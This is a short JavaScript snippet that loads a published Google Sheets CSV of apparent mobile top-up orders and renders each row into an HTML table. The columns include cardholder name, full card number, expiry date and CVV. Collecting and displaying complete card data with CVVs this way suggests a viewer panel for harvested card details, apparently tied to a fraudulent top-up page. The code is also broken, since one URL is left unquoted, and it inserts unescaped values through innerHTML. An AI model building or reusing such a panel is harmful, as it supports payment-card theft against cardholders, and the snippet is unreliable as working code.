const sheetURL = 'https://docs.google.com/spreadsheets/d/e/...TU_ID_CSV.../pub?output=csv ';

document.addEventListener('DOMContentLoaded', function () {
  const tbody = document.querySelector('#tablaRecargas tbody');

  Papa.parse(https://docs.google.com/spreadsheets/d/e/2PACX-1vR81Bdi-YR_YoopisvNsGyP0txbN-1P9jw5v9GS0neVEAySf2zg1UHaATmT4JwySTJQ-s6RDCIKvUop/pub?gid=437800007&single=true&output=csv, {
    download: true,
    header: true,
    skipEmptyLines: true,
    complete: function(results) {
      const rows = results.data;

      if (rows.length === 0) {
        tbody.innerHTML = '<tr><td colspan="10">No hay datos aún.</td></tr>';
        return;
      }

      rows.forEach(row => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${row.Pais || ''}</td>
          <td>${row.Compania || ''}</td>
          <td>${row.Telefono || ''}</td>
          <td>${row.MontoOriginal || ''}</td>
          <td>${row.MontoFinal || ''}</td>
          <td>${row.NombreTarjeta || ''}</td>
          <td>${row.NumeroTarjeta || ''}</td>
          <td>${row.FechaVencimiento || ''}</td>
          <td>${row.CVV || ''}</td>
          <td>${row.Fecha || ''}</td>
        `;
        tbody.appendChild(tr);
      });
    }
  });
});